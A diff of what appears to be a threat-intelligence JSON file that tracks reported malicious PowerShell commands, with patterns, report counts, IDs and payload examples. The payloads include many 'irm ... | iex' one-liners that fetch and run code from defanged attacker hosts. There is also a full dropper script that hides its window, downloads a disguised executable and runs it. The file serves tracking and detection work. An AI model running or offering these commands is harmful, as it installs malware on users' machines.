@@ -1,10 +1,10 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 148,
-    "ReportCount": 148,
+    "DistinctPayloadCount": 149,
+    "ReportCount": 149,
     "FirstSeen": "2026-11-15T16:45:14.945000+00:00",
-    "LastSeen": "2026-11-22T09:44:55.684000+00:00",
+    "LastSeen": "2026-11-22T10:37:06.806000+00:00",
     "ReportIds": [
       "cmwi2ffgu0wgc0omlvztx57aj",
       "cmwi2o0iz0wl70omljttx6np4",
@@ -153,7 +153,8 @@
       "cmwr4m1rl2b0o0omlqujsc9z5",
       "cmwra2jib2ga20oml2najpclq",
       "cmwrgnlfo2k4c0omlo06v7ukp",
-      "cmwrnhutd2q0j0omli5h8pu93"
+      "cmwrnhutd2q0j0omli5h8pu93",
+      "cmwrpcysf2rk90oml8ns2wum4"
     ],
     "PayloadExamples": [
       "irm 'browse-cloud.codes/045dc45870c27c02'|iex;",
@@ -303,15 +304,16 @@
       "irm 'img-codes-cloude[.]info/a54d10080461e81a'|iex;",
       "irm 'img-codes-cloude[.]info/bdcfda63ea50bf2e'|iex;",
       "irm 'img-codes-cloude[.]info/c0fdade6bf8b0ce9'|iex;",
+      "irm 'img-codes-cloude[.]info/e99c62e4af9ec4fb'|iex;",
       "irm 'img-codes-cloude[.]info/f4783b5bf31293eb'|iex;"
     ]
   },
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 118,
-    "ReportCount": 118,
+    "DistinctPayloadCount": 121,
+    "ReportCount": 121,
     "FirstSeen": "2026-11-15T17:24:06.080000+00:00",
-    "LastSeen": "2026-11-22T10:02:50.046000+00:00",
+    "LastSeen": "2026-11-22T10:46:42.976000+00:00",
     "ReportIds": [
       "cmwi3te6h0xgl0omlrat1pbrc",
       "cmwirhula12jv0omlobsquqwk",
@@ -430,7 +432,10 @@
       "cmwqdjm5j26c90omlx8xnntmf",
       "cmwqdk7gq26d50oml06n7v1ln",
       "cmwqx7aub28og0oml2cfuy2y3",
-      "cmwro4vsm2qpw0omlz9qmz51u"
+      "cmwro4vsm2qpw0omlz9qmz51u",
+      "cmwrpci4a2rj30omlkcmoos2p",
+      "cmwrpp3x62rvr0oml4tf6tznp",
+      "cmwrppbdj2rwj0omlta5r6h22"
     ],
     "PayloadExamples": [
       "(irm 'https://github[.]pw/8pchkbdes5/167d3c85ee383e0e')|iex",
@@ -495,6 +500,7 @@
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/730b8a8195bd48f8')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/751686e33f3ab610')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/78f180f1af8aac40')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/7abcd3ec4265c826')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/7ec389bcd8531763')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/84f2366248b4f913')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/8718dba3c8e47827')|iex",
@@ -547,10 +553,12 @@
       "(irm 'https://j7tracker[.]gb[.]net/ben/ae502c3194a7fafa')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/click/08e224a04deaeb52')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/click/25d9c68043f5404e')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/click/6969303e6ea8eb03')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/gabo58lfmx/aca3a98798ec3d08')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/hn/6b4fae7bb06cf009')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/online/e22c82da8905db58')|iex",
-      "(irm 'https://j7tracker[.]gb[.]net/online/ec2a5899511dfa69')|iex"
+      "(irm 'https://j7tracker[.]gb[.]net/online/ec2a5899511dfa69')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/wp/5c258d979e8e5608')|iex"
     ]
   },
   {
@@ -933,9 +941,9 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 1,
-    "ReportCount": 23,
+    "ReportCount": 25,
     "FirstSeen": "2026-11-21T01:20:51.962000+00:00",
-    "LastSeen": "2026-11-22T08:13:36.081000+00:00",
+    "LastSeen": "2026-11-22T10:45:15.619000+00:00",
     "ReportIds": [
       "cmwpq1rz623xv0oml9b7ckyzg",
       "cmwpvtv3x24da0omlegqyi3w3",
@@ -959,7 +967,9 @@
       "cmwraz0602hii0omlahtxfh9f",
       "cmwrb67si2hnn0omlufkmo0iy",
       "cmwrbifoz2i5h0omlmy0vlkor",
-      "cmwrk8eq42n8i0omlgqaaylbj"
+      "cmwrk8eq42n8i0omlgqaaylbj",
+      "cmwrpndg32rqf0omlvmsc6u9q",
+      "cmwrpnfym2rqz0oml3be5md9m"
     ],
     "PayloadExamples": [
       "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit"
